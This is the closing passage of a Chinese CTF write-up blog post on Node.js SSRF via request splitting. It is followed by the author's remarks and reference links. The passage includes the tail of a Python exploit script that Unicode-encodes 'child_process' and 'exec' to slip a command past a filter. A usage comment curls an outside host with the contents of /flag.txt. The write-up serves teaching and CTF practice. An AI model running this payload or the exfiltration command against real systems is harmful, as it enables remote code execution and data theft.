</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;child_process&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5</span><span style=color:#d88200>%9F</span><span style=color:#d88200>%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%A5%C5%B8%C5%A5%C5%A3&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>payload</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>run</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#111>,</span><span style=color:#111>cmd</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payloadC</span> <span style=color:#f92672>=</span>  <span style=color:#111>payloadRaw</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;evalcmd&#34;</span><span style=color:#111>,</span><span style=color:#111>cmd</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>urlC</span> <span style=color:#f92672>=</span> <span style=color:#111>url</span><span style=color:#f92672>+</span><span style=color:#d88200>&#34;/core?q=&#34;</span><span style=color:#f92672>+</span><span style=color:#111>getParm</span><span style=color:#111>(</span><span style=color:#111>payloadC</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>urlC</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>url</span><span style=color:#f92672>+</span><span style=color:#d88200>&#34;/?action=5am3_get_flag&#34;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>text</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>if</span> <span style=color:#111>__name__</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;__main__&#39;</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>targetUrl</span> <span style=color:#f92672>=</span> <span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>argv</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>cmd</span> <span style=color:#f92672>=</span> <span style=color:#111>sys</span><span style=color:#f92672>.</span><span style=color:#111>argv</span><span style=color:#111>[</span><span style=color:#ae81ff>2</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span> <span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#111>targetUrl</span><span style=color:#111>,</span><span style=color:#111>cmd</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># python exp.py http://127.0.0.1:8081 &#34;curl eval.com -X POST -d `cat /flag.txt`&#34;</span>
</span></span></code></pre></div><hr><p>实不相瞒，我被部分编码时应该编哪一些这个问题困扰了一天，经历了n次的环境崩溃和好多好多令人无语的情况；其实用全编码就是最简单快捷的，但是还是想自己折腾一下</p><p>这个系列下一篇应该是HTTP请求走私或者是302跳转ssrf相关的，不过近期应该是不会再碰js了，垃圾Node.js，毁我青春</p><hr><details><summary><h4 class=inline>以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（</h4></summary><p><a href=https://capec.mitre.org/data/definitions/220.html>CAPEC-220: Client-Server Protocol Manipulation</a> | <a href=https://capec.mitre.org/data/definitions/105.html>CAPEC-105: HTTP Request Splitting</a> | <a href=https://capec.mitre.org/data/definitions/33.html>CAPEC-33: HTTP Request Smuggling</a></p><p><a href=https://github.com/nodejs/node/commit/dd20c0186f>http: add &ndash;security-revert for CVE-2018-12116</a></p><p><a href=https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/>Security Bugs in Practice: SSRF via Request Splitting</a></p><p><a href=https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</a></p><p><a href=https://github.com/Hpd0ger/My_ctf_challenge/tree/master/Isoon2019-Membershop>Membershop - docker</a> | <a href=https://github.com/nullcon/hackim-2020/tree/master/web/split_second>Split second - docker</a> | <a href=https://github.com/5am3/My-CTF-Challenges/tree/master/2020-icq-gys>Node Game - docker</a></p><p><a href=https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501>Proxy-Proxy - wp</a> | <a href=https://www.wolai.com/ctfhub/hj3e9WMu8X4ePZ3sADXfsH>Membershop - wp</a> | <a href=https://ctftime.org/writeup/18293>Split second - wp1</a> | <a href=https://r3billions.com/writeup-split-second/>Split second - wp2</a> | <a href=https://blog.p6.is/nullcon-hackim-2020-split-second/>Split second - wp3</a> | <a href=https://www.zhaoj.in/read-6462.html>Node Game - wp</a></p></details></div></section></article></main><div class="w-full h-0 flex-none order-3"></div><aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl"><div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2"><div class="md:max-w-xs flex flex-col md:items-end"><ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col"><li class="px-1 md:px-0"><a href=/posts/ title="Posts page">Posts</a></li><li class="px-1 md:px-0"><a href=/life/ title="Fxxking life page">Fxxking life</a></li><li class="px-1 md:px-0"><a href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><li class="px-1 md:px-0"><a href=https://travellings.link title="Travelling page">Travelling</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=V2VkIDI3IEFwcmlsIDIwMjIgMTE6MzM6MTUgVVRD target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href='Vmlja3lja3lreQ==' target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/7562434112 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 5422 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/2021/12/04/laravel-5.8.x-pop-gadgets/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>Laravel-5.8.x反序列化pop链学习</a>
<a class=flex-grow-0 href=/2021/12/12/nitectf2021-wp/>niteCTF2021 Wp<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>